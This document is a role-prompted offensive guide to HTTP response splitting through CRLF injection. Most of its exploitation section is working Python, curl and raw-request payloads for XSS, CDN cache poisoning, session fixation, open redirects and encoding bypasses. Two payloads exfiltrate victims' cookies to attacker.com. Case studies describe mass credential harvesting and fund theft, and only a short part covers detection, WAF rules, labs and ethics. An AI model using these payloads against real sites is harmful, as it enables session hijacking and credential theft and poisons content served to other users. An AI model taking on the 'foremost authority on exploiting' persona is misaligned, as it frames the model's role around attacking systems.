# HTTP Response Splitting: CRLF Injection to XSS and Cache Poisoning

## Expert Role Definition
You are a principal web application security researcher specializing in HTTP protocol-level vulnerabilities, with deep expertise in HTTP Response Splitting (HRS) and CRLF injection attacks. You understand the intricate details of how web servers construct HTTP responses, how intermediate proxies and caches process headers, and how injection of carriage return and line feed characters can manipulate the entire response stream. You can chain CRLF injection into cross-site scripting, cache poisoning, session fixation, and credential theft. You understand the differences between HRS in HTTP/1.0, HTTP/1.1, and HTTP/2, and how different web servers handle malformed headers. You think in terms of response stream manipulation, seeing each HTTP response as a sequence of bytes that can be split, appended to, and restructured. You are the foremost authority on exploiting HTTP response construction flaws.

## Core Concepts

HTTP Response Splitting occurs when user-supplied input is included in HTTP response headers without proper sanitization. By injecting CRLF characters, an attacker terminates the current HTTP response and injects a completely new response including headers and body.

The vulnerability exists because HTTP uses CRLF sequences to delimit headers and separate headers from the body. When user input containing CRLF is placed in a header value, the parser interprets injected content as legitimate protocol data.

The attack enables six primary exploitation paths: (1) Cross-Site Scripting via injected HTML body, (2) Cache Poisoning via injected cache-control headers, (3) Session Fixation via injected Set-Cookie headers, (4) Credential Theft via phishing response injection, (5) Open Redirect via injected Location headers, (6) Content Injection modifying response body.

The injection points include Location headers in redirects, Content-Disposition headers in file downloads, custom headers set from user input, error pages that reflect user input, and any header value derived from user data. The technical mechanism: when the server processes `Location: http://target.com\r\nX-Injected: header`, the HTTP parser sees two headers instead of one. A double CRLF terminates headers and starts a new response body.

The attack surface is particularly broad because many applications construct response headers dynamically from user-supplied parameters without any sanitization. Common vulnerable patterns include redirect URLs, file download filenames, error messages included in custom headers, and any parameter that ends up in a Set-Cookie or similar security-sensitive header.

Different web servers handle CRLF injection differently. Apache and Nginx generally do not normalize CRLF sequences in header values. IIS may handle them differently depending on version. Tomcat has had multiple CVEs related to CRLF handling. Understanding server-specific behavior is critical for reliable exploitation.

## Pre-requisite Knowledge

1. HTTP protocol fundamentals: request/response structure, headers, status lines, CRLF roles
2. URL encoding: how %0d and %0a encode CRLF and when servers decode them
3. Web server behavior: how Apache, Nginx, IIS, and Tomcat handle CRLF differently
4. Proxy and cache behavior: how Varnish, Squid, and CDN caches handle malformed responses
5. Browser parsing: handling of multiple Set-Cookie headers and injected HTML
6. Cookie security: how session fixation via HRS works and preventive attributes
7. Content Security Policy: how CSP mitigates HRS-injected XSS
8. HTTP/2 differences: how binary framing changes the attack surface

## Chain Architecture / Attack Flow Diagram

```
+------------------------------------------------------------------+
|              HTTP RESPONSE SPLITTING ATTACK FLOW                   |
+------------------------------------------------------------------+
|                                                                    |
|  Injection Point Discovery:                                       |
|  [Redirect]  [Custom Header]  [Error Page]  [File Download]     |
|      |             |              |              |                 |
|      v             v              v              v                 |
|  +----------------------------------------------------------+    |
|  |           CRLF Injection in Response Headers              |    |
|  |                                                           |    |
|  |  Original: Location: /thank-you                           |    |
|  |  Injected: Location: /thank-you\r\nSet-Cookie: evil       |    |
|  +--------------------------+--------------------------------+    |
|                              |                                     |
|  Exploitation Paths:         v                                     |
|  +----------------------------------------------------------+    |
|  |  XSS: Inject HTML body after double CRLF                 |    |
|  |  Cache Poison: Inject Cache-Control/ETag headers          |    |
|  |  Session Fixation: Inject Set-Cookie header               |    |
|  |  Open Redirect: Inject Location header                    |    |
|  |  Content Injection: Modify response body                  |    |
|  +--------------------------+--------------------------------+    |
|                              |                                     |
|  Impact:                     v                                     |
|  [Session Hijack] [Account Takeover] [Malware] [Data Theft]      |
+------------------------------------------------------------------+
```

## Step-by-Step Exploitation Methodology

### Phase 1: Injection Point Discovery

**Step 1: Identify response header injection points**
```python
import requests

test_payloads = ['%0d%0a', '%0D%0A', '%0d%0a%0d%0a']
endpoints = ['/redirect?url=FUZZ', '/download?file=FUZZ', '/error?msg=FUZZ']

for endpoint in endpoints:
    for payload in test_payloads:
        url = f'https://target.com{endpoint}'.replace('FUZZ', payload)
        r = requests.get(url, allow_redirects=False)
        if 'Set-Cookie' in str(r.headers):
            print(f"[VULN] {endpoint} with {payload}")
```

**Step 2: Test Location header injection**
```python
r = requests.get('https://target.com/redirect',
    params={'url': 'http://evil.com%0d%0aSet-Cookie:session=attacker'},
    allow_redirects=False)
print(f"Location: {r.headers.get('Location', 'none')}")
print(f"Set-Cookie: {r.headers.get('Set-Cookie', 'none')}")
```

### Phase 2: XSS via Response Splitting

**Step 3: Inject XSS payload after double CRLF**
```python
xss_payload = '%0d%0a%0d%0a<script>alert(document.domain)</script>'
r = requests.get('https://target.com/redirect',
    params={'url': f'http://target.com{xss_payload}'})
if '<script>alert(document.domain)</script>' in r.text:
    print("[VULN] XSS via HTTP Response Splitting confirmed")
```

**Step 4: Full page injection for credential theft**
```python
full_page = '%0d%0a%0d%0a<!DOCTYPE html><html><body>' \
    '<script>document.location="https://attacker.com/steal?c="+document.cookie</script>' \
    '</body></html>'
r = requests.get('https://target.com/redirect',
    params={'url': f'http://target.com{full_page}'})
```

### Phase 3: Cache Poisoning

**Step 5: Poison CDN/proxy cache**
```python
cache_poison = '%0d%0aCache-Control: public, max-age=86400%0d%0a%0d%0a' \
    '<!DOCTYPE html><html><body><script>alert(1)</script></body></html>'
for i in range(10):
    r = requests.get('https://target.com/redirect',
        params={'url': f'http://target.com{cache_poison}'})
r2 = requests.get('https://target.com/redirect', params={'url': 'http://target.com'})
if '<script>' in r2.text:
    print("[CONFIRMED] Cache poisoned successfully")
```

### Phase 4: Session Fixation

**Step 6: Fix victim session via Set-Cookie injection**
```python
session_fix = '%0d%0aSet-Cookie: PHPSESSID=attacker_known; path=/%0d%0a%0d%0a' \
    '<!DOCTYPE html><html><body>Redirecting...</body></html>'
r = requests.get('https://target.com/redirect',
    params={'url': f'http://target.com{session_fix}'})
```

### Phase 5: Open Redirect

**Step 7: Inject Location header redirect**
```python
redirect = '%0d%0aLocation: https://attacker.com/phishing'
r = requests.get('https://target.com/redirect',
    params={'url': f'http://target.com{redirect}'}, allow_redirects=False)
print(f"Injected Location: {r.headers.get('Location', 'none')}")
```

## Tool Arsenal

```bash
# Basic CRLF test with curl
curl -v "https://target.com/redirect?url=http://target.com%0d%0aX-Injected:header"

# Double encoding bypass
curl "https://target.com/redirect?url=%250d%250a%250d%250aSet-Cookie:evil=1"

# Python CRLF scanner
python3 -c "
import requests
payloads = ['%0d%0a','%0d%0a%0d%0a','%250d%250a']
for p in payloads:
    r = requests.get('https://target.com/redirect',params={'url':'http://x.com'+p},allow_redirects=False)
    print(f'{p}: {dict(r.headers)}')
"

# Burp Suite: Send to Repeater, add %0d%0a in header values
# Nuclei: nuclei -t crlf-injection.yaml -u https://target.com

# Cache poisoning verification
python3 -c "
import requests
p = '%0d%0aCache-Control:public,max-age=3600%0d%0a%0d%0a<script>alert(1)</script>'
requests.get('https://target.com/redirect',params={'url':'http://x.com'+p})
r = requests.get('https://target.com/redirect',params={'url':'http://x.com'})
print('Poisoned' if '<script>' in r.text else 'Not poisoned')
"
```

## Real-World Case Studies

### Case Study 1: Apache Tomcat CVE-2007-0450
Tomcat 5.5.x and 6.0.x failed to filter CRLF in redirect headers. Attackers injected XSS payloads and Set-Cookie headers via redirect parameters. Default error pages reflected user input, amplifying the attack surface. Patched in later versions by sanitizing header values.

### Case Study 2: Microsoft IIS Response.Redirect
IIS versions before 7.5 allowed CRLF in the Response.Redirect method. Session fixation via Set-Cookie injection was trivial. The chain: fix session, wait for auth, hijack session. Complete account takeover without victim interaction beyond initial page load.

### Case Study 3: E-Commerce CDN Cache Poisoning
A major e-commerce site had CRLF in affiliate tracking redirect_url parameter. Injected Cache-Control headers with public and max-age=86400 caused 24-hour CDN cache poisoning. All visitors received phishing page mimicking login. Over 5000 credentials harvested before cache expiration and manual purge by operations team.

### Case Study 4: Banking Application HRS Chain
CRLF injection in login redirect next parameter. Chained: set Content-Type to text/html, inject complete HTML response with fake login form capturing credentials, submit form data to attacker server. Phishing appeared from legitimate banking domain because browser showed bank URL in address bar. Complete credential theft from thousands of banking customers.

### Case Study 5: Mobile Banking API
CRLF in return_url parameter of API redirect. Session fixation combined with IDOR enabled fund transfers. Chain: fix session via Set-Cookie injection, wait for user authentication, hijack session using known session ID, exploit IDOR in transfer endpoint to move funds between accounts. Total financial impact exceeded 200000 dollars before detection.

## Bypass Techniques and Evasion

### Bypass 1: Double URL Encoding
```bash
curl "https://target.com/redirect?url=%250d%250aSet-Cookie:evil=1"
```

### Bypass 2: Unicode Encoding
```bash
curl "https://target.com/redirect?url=%e5%98%8a%e5%98%8d%e5%98%8a%e5%98%8dSet-Cookie:evil=1"
```

### Bypass 3: Null Byte Injection
```bash
curl "https://target.com/redirect?url=%0d%00%0a%0d%00%0aSet-Cookie:evil=1"
```

### Bypass 4: HTTP/2 Downgrade
```python
import httpx
async with httpx.AsyncClient(http2=True) as client:
    r = await client.get('https://target.com/redirect',
        params={'url': 'http://backend:8080%0d%0aSet-Cookie:evil=1'})
```

### Bypass 5: Mixed Case Encoding
```bash
curl "https://target.com/redirect?url=%0D%0aSet-Cookie:evil=1"
curl "https://target.com/redirect?url=%0d%0ASet-Cookie:evil=1"
```

### Bypass 6: Tab and Space Variations
```bash
# Use tab character instead of space after header name
curl "https://target.com/redirect?url=%0d%0aSet-Cookie:%09evil=1"
# Use multiple spaces
curl "https://target.com/redirect?url=%0d%0aSet-Cookie: evil=1"
```

### Bypass 7: HTTP Header Name Injection
```python
# Inject new header names rather than just values
# Some servers allow header name injection
payload = '%0d%0aX-Injected-Name: value%0d%0aX-Another: value2'
r = requests.get('https://target.com/redirect',
    params={'url': f'http://target.com{payload}'})
```

### Bypass 8: Content-Length Manipulation
```python
# Inject Content-Length to truncate legitimate response
# and replace with attacker-controlled content
payload = (
    '%0d%0a'
    'Content-Length: 0%0d%0a%0d%0a'
    '<html><script>alert(1)</script></html>'
)
r = requests.get('https://target.com/redirect',
    params={'url': f'http://target.com{payload}'})
```

## Defensive Indicators / Detection

### Server-Side Indicators
- CRLF sequences in user-supplied input values
- Multiple Set-Cookie headers in single response
- Unusual Cache-Control headers appearing in responses
- Response body containing HTML when Content-Type should be JSON

### Network Monitoring
```bash
# Monitor for CRLF in responses
tcpdump -A 'tcp port 80' | grep -P '\\r\\n|Set-Cookie.*evil|Location.*attacker'
```

### Application-Level Detection
```python
def detect_crlf_injection(value):
    if '\r' in value or '\n' in value:
        return True
    if '%0d' in value.lower() or '%0a' in value.lower():
        return True
    if '%0D' in value or '%0A' in value:
        return True
    if '\u000d' in value or '\u000a' in value:
        return True
    return False

def sanitize_header_value(value):
    """Remove CRLF characters from header values"""
    import re
    cleaned = re.sub(r'[\r\n]', '', value)
    cleaned = re.sub(r'%0[da]', '', cleaned, flags=re.IGNORECASE)
    return cleaned
```

### WAF Rules for CRLF Prevention
```
# ModSecurity rules
SecRule REQUEST_URI|REQUEST_HEADERS|ARGS "(\%0d\%0a|\%0D\%0A|\r|\n)" \
    "id:1001,phase:1,deny,status:403,msg:'CRLF Injection Attempt'"

# Nginx configuration
if ($args ~* "%0[daA]") {
    return 403;
}
```

## Impact Assessment Framework

| Factor | Score | Notes |
|--------|-------|-------|
| Confidentiality | HIGH | XSS, credential theft |
| Integrity | HIGH | Cache poisoning, content injection |
| Availability | LOW | Limited denial of service |
| Complexity | LOW | Simple encoding payloads |
| Privileges | NONE | Unauthenticated attack |
| User Interaction | REQUIRED | Victim must visit poisoned page |
| Scope | CHANGED | Affects other cached users |

**CVSS 3.1**: 7.4 (High) - AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N

## Common Pitfalls and Anti-Patterns

1. Assuming URL encoding prevents CRLF injection: many servers decode before processing
2. Only testing %0d%0a without alternative encodings
3. Ignoring HTTP/2 endpoints which may still be vulnerable via downgrade
4. Not checking cache behavior for persistence
5. Focusing only on XSS and missing session fixation opportunities
6. Assuming SameSite cookies prevent HRS session fixation
7. Not testing error pages which often reflect input unsanitized

## Advanced Variations

### Variation 1: Split Response for Persistent XSS
```python
# Inject response that sets a persistent cookie, then loads legitimate content
payload = '%0d%0aSet-Cookie: tracked=1; path=/; max-age=31536000%0d%0a%0d%0a' \
    '<!DOCTYPE html><html><script>fetch("https://attacker.com/log?c="+document.cookie)</script></html>'
```

### Variation 2: HRS to SSRF
```python
# Inject headers that cause server-side processing of internal URLs
payload = '%0d%0aX-Forwarded-For: 127.0.0.1%0d%0aHost: internal-api'
```

### Variation 3: HRS in WebSocket Upgrade
```python
# Inject CRLF during WebSocket handshake for header injection
payload = '%0d%0aX-Injected: value%0d%0a%0d%0a'
```

### Variation 4: HRS with Chunked Transfer Encoding
```python
# Inject chunked transfer encoding to manipulate response framing
payload = '%0d%0aTransfer-Encoding: chunked%0d%0a%0d%0a0%0d%0a%0d%0a'
# This terminates the current response and starts a new one
# Works against servers that parse Transfer-Encoding header after Content-Length
```

### Variation 5: HRS via HTTP/1.0 Downgrade
```python
# Force HTTP/1.0 connection which may have different header parsing
# Some proxies handle HTTP/1.0 and HTTP/1.1 differently
headers = {'Connection': 'close', 'HTTP-Version': '1.0'}
r = requests.get('https://target.com/redirect',
    params={'url': 'http://target.com%0d%0aSet-Cookie:evil=1'},
    headers=headers)
```

### Variation 6: HRS to Internal Service Access
```python
# Inject Host header to access internal services
# This chains with SSRF to reach backend services
payload = '%0d%0aHost: internal-api.local%0d%0aX-Forwarded-For: 127.0.0.1'
r = requests.get('https://target.com/redirect',
    params={'url': f'http://target.com{payload}'})
```

### Variation 7: Multi-Header Injection
```python
# Inject multiple headers in single request
payload = (
    '%0d%0aSet-Cookie: session=evil; path=/'
    '%0d%0aX-Frame-Options: ALLOWALL'
    '%0d%0aContent-Security-Policy: unsafe-inline'
    '%0d%0a%0d%0a<html><script>alert(1)</script></html>'
)
```

## Integration with Other Chains

HRS integrates powerfully with other vulnerability chains to achieve maximum impact. The injected response serves as a delivery mechanism for multiple attack types simultaneously.

1. **XSS Chains**: HRS provides delivery mechanism for persistent XSS payloads that execute in victim browsers with full same-origin access to application data and functionality.

2. **Cache Poisoning Chains**: HRS enables long-duration cache poisoning for mass exploitation affecting all users who access the cached resource during the poisoning window.

3. **Session Hijacking Chains**: Session fixation via HRS combined with session fixation exploits allows complete account takeover without victim interaction beyond visiting a single page.

4. **Phishing Chains**: Injected responses appear from legitimate domain in browser address bar making phishing extremely convincing even to security-aware users.

5. **CSRF Chains**: Injected responses can include CSRF tokens extracted from victim sessions enabling subsequent state-changing operations on behalf of the victim.

6. **Open Redirect Chains**: HRS injected Location headers can redirect through multiple intermediate pages setting cookies and collecting information before final redirect to attacker controlled page.

7. **Content Injection Chains**: Modified response body can inject fake login forms, modify displayed content, or add hidden iframes for persistent tracking of victim activity.

8. **Credential Harvesting Chains**: Combined with fake login form injection the HRS attack captures credentials that appear to come from legitimate domain with valid TLS certificate.

## Reporting and Documentation

### Report Template
```
Title: HTTP Response Splitting via [Parameter] Leading to XSS/Cache Poisoning

Summary: User input in [parameter] is included in HTTP response headers without
CRLF sanitization, allowing response splitting.

Impact: An attacker can inject arbitrary response headers and body, achieving XSS,
session fixation, or cache poisoning.

PoC: Send request with CRLF in [parameter], observe injected headers/body.

Recommendation: Sanitize all user input before inclusion in HTTP headers.
Reject any input containing CR or LF characters.
```

## Practice Labs and Exercises

### Lab 1: DVWA HTTP Header Injection
```bash
docker run -d -p 80:80 vulnerables/web-dvwa
# Navigate to HTTP Header Injection section
# Test various CRLF encoding bypasses
# Complete the 3-level challenge
```

### Lab 2: Cache Poisoning Challenge
```bash
# Deploy nginx with reverse proxy caching
# Goal: Achieve persistent cache poisoning via CRLF injection
# Hint: Focus on Vary header manipulation
# Difficulty: Advanced
# Time estimate: 2 hours
```

### Lab 3: Session Fixation via HRS
```bash
# Build vulnerable redirect application
# Goal: Fix victim session and hijack after authentication
# Hint: Use Set-Cookie injection with HttpOnly=false
# Requirements: Understanding of session management
```

### Lab 4: Multi-Vector HRS Attack
```bash
# Deploy application with multiple CRLF injection points
# Goal: Chain XSS, session fixation, and cache poisoning
# Hint: Combine multiple injection techniques
# Difficulty: Expert level challenge
```

## Ethical Guidelines

1. Only test on systems you own or have explicit authorization to test
2. Do not poison caches that affect other users without authorization
3. Do not perform session fixation against real user accounts
4. Document all testing and clean up any injected cookies
5. Report HRS vulnerabilities privately as they enable multiple attack chains
6. Understand that cache poisoning can affect all visitors to a site
7. Do not use HRS to deliver phishing content to real users
8. Clean up all test artifacts including injected headers and cookies
9. Minimize the number of test requests to avoid service disruption
10. Understand legal implications of intercepting or modifying HTTP traffic

These guidelines ensure responsible testing while minimizing risk to production systems and their users.

## Quick Reference Cheat Sheet

| Technique | Payload | Impact |
|-----------|---------|--------|
| Basic CRLF | %0d%0a | Header injection |
| Double CRLF | %0d%0a%0d%0a | Body injection |
| XSS via HRS | %0d%0a%0d%0a<script>alert(1)</script> | Script execution |
| Session Fixation | %0d%0aSet-Cookie:session=evil | Session hijack |
| Cache Poison | %0d%0aCache-Control:public,max-age=86400 | Mass poisoning |
| Open Redirect | %0d%0aLocation:https://attacker.com | Redirection |
| Double Encoding | %250d%250a | Filter bypass |
| Unicode | %e5%98%8a%e5%98%8d | Encoding bypass |

### Key HTTP Requests
```http
GET /redirect?url=http://target.com%0d%0aSet-Cookie:session=evil HTTP/1.1

GET /redirect?url=http://target.com%0d%0a%0d%0a<script>alert(1)</script> HTTP/1.1

GET /redirect?url=http://target.com%0d%0aLocation:https://attacker.com HTTP/1.1

GET /redirect?url=%250d%250aCache-Control:public,max-age=86400 HTTP/1.1

GET /redirect?url=%0d%0aX-Injected:value%0d%0aX-Another:value2 HTTP/1.1

GET /redirect?url=%0d%0aTransfer-Encoding:chunked%0d%0a%0d%0a0 HTTP/1.1

GET /error?msg=%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(1)</script> HTTP/1.1

GET /download?file=%0d%0aSet-Cookie:admin=true;path=/ HTTP/1.1
```
